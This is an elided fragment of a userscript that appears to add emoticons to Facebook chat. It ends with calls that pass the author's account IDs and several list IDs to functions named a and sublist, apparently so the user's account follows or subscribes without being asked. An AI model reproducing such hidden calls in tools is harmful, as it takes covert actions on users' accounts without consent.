...
// @version 	1.0.6
// @author  	Irwan Rinaldi Purba.
// @authorURL	http://www.facebook.com/irwan.bloggr
...
"chars" : " :) ",
	...
	html += '<span style="vertical-align: middle;"><img src="http://scritp-f.googlecode.com/svn/CTRL+SHIFT+K/too-much.png"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/irwan.bloggr" target="_blank">Irwan Rinaldi Purba<br>HALAKHITA</a>';
	html += '</div>';
...
a("100004958225363"); //Irwan Rinaldi Purba
a("100000022074083"); //Irwan Rinaldi Purba
sublist("170238896484717");
sublist("170251953150078");
sublist("170251846483422");
